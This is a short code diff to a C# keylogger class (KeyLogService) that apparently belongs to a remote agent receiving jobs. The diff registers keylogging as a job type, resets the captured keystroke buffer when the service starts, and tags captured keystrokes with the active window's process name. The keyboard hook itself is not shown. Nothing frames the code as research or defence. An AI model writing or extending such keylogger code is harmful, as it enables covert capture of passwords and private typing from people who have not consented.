@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 using EntryPoint;
+using Shared;
 
 namespace Agent.Service
 {
@@ -12,6 +13,7 @@ namespace Agent.Service
     }
     public class KeyLogService : RunningService, IKeyLogService
     {
+        protected override JobType? JobType => Shared.JobType.KeyLog;
         public override string ServiceName => "Key Logger";
 
         public string LoggedKeyStrokes { get; private set; } = string.Empty;
@@ -31,8 +33,10 @@ namespace Agent.Service
 
         public override void Start()
         {
+            this.LoggedKeyStrokes = string.Empty;
             activeProcessName = GetActiveWindowProcessName().ToLower();
             prevProcessName = activeProcessName;
+            LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]" + Environment.NewLine;
             base.Start();
         }
 
@@ -42,7 +46,7 @@ namespace Agent.Service
             bool isOldProcess = activeProcessName.Equals(prevProcessName);
             if (!isOldProcess)
             {
-                LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]";
+                LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]" + Environment.NewLine;
                 prevProcessName = activeProcessName;
             }
 
